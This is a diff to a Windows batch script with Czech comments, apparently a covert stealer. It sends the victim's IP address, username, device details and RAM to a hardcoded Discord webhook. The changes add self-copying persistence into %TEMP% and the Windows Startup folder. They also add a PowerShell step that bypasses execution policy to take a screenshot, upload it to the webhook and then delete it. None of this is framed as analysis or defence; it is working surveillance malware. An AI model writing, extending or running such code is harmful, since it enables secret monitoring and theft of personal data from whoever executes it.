@@ -5,6 +5,18 @@ setlocal EnableDelayedExpansion
 :: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
+:: 📂 Cesty
+set "bootbat=%TEMP%\boot.bat"
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"
+
+:: 🔁 Samonáprava: pokud není v TEMP nebo autostartu, naklonuj
+if not exist "%bootbat%" (
+    copy /y "%~f0" "%bootbat%" >nul
+)
+if not exist "%startup%" (
+    copy /y "%~f0" "%startup%" >nul
+)
+
 :: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
 set "user=%USERNAME%"
@@ -40,14 +52,20 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalm
 set /a ram=%ramRaw:~0,-6%
 
 :: 🧾 Zpráva
-set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
+set "msg=🛰️ IP: !ip! | Čas: !timestamp! | Uživatel: !user! | Zařízení: !deviceType! | Model: !deviceModel! | RAM: !ram! GB"
 
-:: 📤 Odeslání na webhook
-set "payload=%TEMP%\payload.json"
-echo { > "!payload!"
-echo   "content": "!msg!" >> "!payload!"
-echo } >> "!payload!"
-curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
-del /f /q "!payload!"
+:: 📤 Odeslání na webhook jako prostý text
+curl -s -X POST %webhook% -d "content=!msg!" >nul
+
+:: 📸 Screenshot
+set "ss=%TEMP%\screenshot_%RANDOM%.png"
+del /f /q "%ss%" >nul 2>&1
+
+powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
+
+if exist "%ss%" (
+    curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
+    del /f /q "%ss%"
+)
 
 exit
